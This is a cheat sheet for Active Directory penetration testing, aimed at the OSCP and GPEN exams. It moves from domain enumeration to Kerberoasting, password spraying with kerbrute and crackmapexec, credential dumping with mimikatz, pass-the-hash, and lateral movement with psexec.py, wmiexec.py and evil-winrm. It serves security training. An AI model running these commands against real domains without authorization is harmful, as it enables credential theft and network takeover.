# Active Directory Enumeration & Penetration Testing Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured methodology for enumerating and attacking Active Directory environments** during **OSCP and GPEN exams**.

Core methodology:

```
Initial Access → Enumeration → Credential Access → Privilege Escalation → Lateral Movement → Domain Dominance
```

Active Directory attacks are **primarily enumeration-driven**. The more information you gather, the easier exploitation becomes.

---

# 1. Identify Domain Information

## Check current domain

```powershell
whoami
whoami /all
```

Check domain:

```powershell
echo %USERDOMAIN%
```

PowerShell:

```powershell
Get-WmiObject Win32_ComputerSystem
```

---

# 2. Domain Controller Discovery

Find domain controller:

```powershell
nltest /dsgetdc:<domain>
```

Alternative:

```powershell
nslookup
set type=SRV
_ldap._tcp.dc._msdcs.<domain>
```

---

# 3. Domain User Enumeration

List domain users:

```powershell
net user /domain
```

PowerShell:

```powershell
Get-ADUser -Filter *
```

---

# 4. Domain Group Enumeration

List groups:

```powershell
net group /domain
```

Check group members:

```powershell
net group "Domain Admins" /domain
```

---

# 5. Domain Computer Enumeration

List computers:

```powershell
net view /domain
```

PowerShell:

```powershell
Get-ADComputer -Filter *
```

---

# 6. Share Enumeration

List shares:

```powershell
net view \\<host>
```

Connect to share:

```powershell
net use \\<host>\share
```

---

# 7. Domain Password Policy

Check password policy:

```powershell
net accounts /domain
```

Look for:

```
minimum password length
lockout policy
password complexity
```

---

# 8. SPN Enumeration (Kerberoasting)

List service accounts:

```powershell
setspn -T <domain> -Q */*
```

PowerShell:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Kerberoasting can extract service ticket hashes.

---

# 9. LDAP Enumeration

Query LDAP:

```powershell
ldapsearch -x -h <domain_controller>
```

Enumerate users:

```powershell
ldapsearch -x -b "dc=domain,dc=com"
```

---

# 10. SMB Enumeration

List SMB shares:

```bash
smbclient -L //<target>
```

Anonymous access:

```bash
smbclient -L //<target> -N
```

---

# 11. Kerberos Enumeration

Check Kerberos users:

```bash
kerbrute userenum users.txt -d domain.local
```

Password spraying:

```bash
kerbrute passwordspray users.txt password -d domain.local
```

---

# 12. Password Spraying

Try common passwords across users:

```bash
crackmapexec smb <target> -u users.txt -p password
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p Winter2023!
```

---

# 13. Credential Dumping

Dump credentials (if privileged):

```powershell
mimikatz
```

Common commands:

```
privilege::debug
sekurlsa::logonpasswords
```

---

# 14. Pass-the-Hash

Use NTLM hash for authentication:

```bash
crackmapexec smb <target> -u administrator -H <hash>
```

---

# 15. Pass-the-Ticket

Use Kerberos tickets:

```
kerberos ticket injection
```

---

# 16. BloodHound Enumeration

Collect domain information:

```powershell
SharpHound.exe -c All
```

Upload results to BloodHound for attack path analysis.

---

# 17. Domain Trust Enumeration

Check trusts:

```powershell
nltest /domain_trusts
```

PowerShell:

```powershell
Get-ADTrust
```

---

# 18. Admin Session Enumeration

Find logged-in administrators:

```bash
crackmapexec smb <target> --sessions
```

---

# 19. Local Admin Access

Check admin rights:

```bash
crackmapexec smb <target> -u user -p password --local-auth
```

---

# 20. Lateral Movement

Methods:

```
SMB
WinRM
WMI
PsExec
```

Example:

```bash
psexec.py domain/user:password@target
```

---

# 21. WinRM Access

Check WinRM:

```bash
crackmapexec winrm <target> -u user -p password
```

Connect:

```bash
evil-winrm -i <target> -u user -p password
```

---

# 22. WMI Execution

Execute commands remotely:

```bash
wmiexec.py domain/user:password@target
```

---

# 23. RDP Access

Check RDP:

```bash
nmap -p3389 <target>
```

Connect:

```bash
xfreerdp /u:user /p:password /v:<target>
```

---

# 24. GPO Enumeration

Check Group Policy Objects:

```powershell
Get-GPO -All
```

Look for misconfigurations.

---

# 25. File Share Enumeration

Search for sensitive files:

```
passwords
backup
config
credentials
```

---

# 26. Common AD Attack Paths

Typical OSCP/GPEN attacks:

```
Kerberoasting
Password spraying
Pass-the-hash
Pass-the-ticket
Token impersonation
Misconfigured ACLs
GPO abuse
```

---

# 27. Important Enumeration Questions

Always ask:

```
Who are the domain admins?
Where are credentials stored?
Which systems allow lateral movement?
```

---

# 28. Quick Enumeration Commands

Run after gaining domain access:

```powershell
whoami /all
net user /domain
net group /domain
net group "Domain Admins" /domain
net view /domain
net accounts /domain
```

---

# 29. Automated Enumeration Tools

Useful tools:

```
SharpHound
BloodHound
PowerView
Seatbelt
winPEAS
```

---

# 30. Final Advice

Active Directory attacks depend heavily on **information gathering**.

Always remember:

```
The domain already contains the information you need to compromise it.
Your job is to find it.
```
